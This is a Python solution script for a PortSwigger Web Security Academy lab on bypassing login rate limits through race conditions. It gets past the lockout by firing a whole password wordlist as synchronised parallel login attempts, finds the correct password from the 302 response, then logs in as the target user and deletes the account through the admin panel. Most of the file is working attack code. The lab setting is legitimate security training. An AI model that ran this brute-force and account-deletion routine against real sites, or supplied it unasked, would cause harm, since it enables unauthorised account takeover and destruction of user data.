# Lab 02 — Bypassing rate limits via race conditions
# PortSwigger: https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
#
# Vulnerability: The login rate limiter's failure counter isn't
#                incremented atomically — many parallel login attempts
#                can all be checked against the "3 failures" threshold
#                before any single one registers as a failure
# Aim:           Brute-force carlos's password from a candidate wordlist,
#                then delete carlos via the admin panel
#
# Technique:
#   Fire the ENTIRE candidate password list as parallel login attempts in
#   one synchronised burst, rather than sequentially (which would trigger
#   the 3-attempt lockout). If the correct password is in the list, its
#   request returns a 302 redirect amid a flood of failed-login 200s.
#
# Usage: python race_conditions_lab02.py <url> <passwords_file>

import sys
import urllib3
from proxies import proxies
from race_conditions_utils import (banner, section, make_session, login,
                                    get_csrf_from_response, send_parallel,
                                    warm_connection, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_USERNAME = "carlos"


def load_wordlist(path):
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"  ✘  Wordlist not found: {path}")
        return []


if __name__ == "__main__":
    banner()
    section("LAB 02 — BYPASSING RATE LIMITS VIA RACE CONDITIONS")

    if len(sys.argv) != 3:
        print("  Usage: python race_conditions_lab02.py <url> <passwords_file>")
        sys.exit(1)

    url = sys.argv[1]
    pfile = sys.argv[2]
    passwords = load_wordlist(pfile)
    if not passwords:
        sys.exit(1)

    print(f"\n  ℹ  Loaded {len(passwords)} candidate passwords\n")

    session = make_session(proxies)
    warm_connection(session, url)

    # ── Step 1: confirm normal sequential attempts DO get locked out ────────
    print("  ── Step 1: confirm sequential attempts trigger lockout (baseline)\n")
    for i, pw in enumerate(passwords[:4], 1):
        login_page = session.get(f"{url}/login")
        csrf = get_csrf_from_response(login_page.text)
        data = {"username": TARGET_USERNAME, "password": pw}
        if csrf:
            data["csrf"] = csrf
        r = session.post(f"{url}/login", data=data, allow_redirects=False)
        print(f"  ·  attempt {i} ({pw!r}) → status {r.status_code}")
        if i == 4 and "lock" in r.text.lower():
            print("  ✔  Lockout confirmed after sequential attempts\n")

    # ── Step 2: wait briefly, then fire ALL candidates in parallel ───────────
    print("\n  ── Step 2: fire ALL candidate passwords in one parallel burst\n")
    print("  ℹ  Fresh session per attempt to avoid our own prior lockout")
    print("     interfering — each thread gets an independent session.\n")

    def make_attempt(password):
        def _attempt():
            attempt_session = make_session(proxies)
            login_page = attempt_session.get(f"{url}/login")
            csrf = get_csrf_from_response(login_page.text)
            data = {"username": TARGET_USERNAME, "password": password}
            if csrf:
                data["csrf"] = csrf
            r = attempt_session.post(f"{url}/login", data=data, allow_redirects=False)
            return (password, r)
        return _attempt

    request_funcs = [make_attempt(pw) for pw in passwords]
    results = send_parallel(request_funcs, timeout=30)

    # ── Step 3: find the successful attempt ──────────────────────────────────
    print("  ── Step 3: scan results for a successful (302) login\n")
    found_password = None
    for result in results:
        if result is None or isinstance(result, Exception):
            continue
        password, response = result
        if response.status_code == 302:
            found_password = password
            print(f"  ✔  Found valid password: {password!r}")
            break

    if not found_password:
        print("  ✘  No successful login found in this burst.")
        print("     The race window may be narrow — try re-running, or use")
        print("     Turbo Intruder with its gate mechanism for more reliable")
        print("     timing (see module notes for the script template).")
        sys.exit(1)

    print_box("CRACKED PASSWORD", f"{TARGET_USERNAME}:{found_password}")

    # ── Step 4: log in for real and delete carlos ────────────────────────────
    print("  ── Step 4: log in as carlos and delete carlos via admin panel\n")
    admin_session = make_session(proxies)
    if login(admin_session, url, username=TARGET_USERNAME, password=found_password):
        r_delete = admin_session.post(f"{url}/admin/delete", data={"username": TARGET_USERNAME})
        check_status(r_delete, [200, 302], "Delete carlos")
    else:
        print("  ✘  Login failed — the account may still be temporarily locked")
        print("     from the baseline test in Step 1. Wait 60s and retry.")
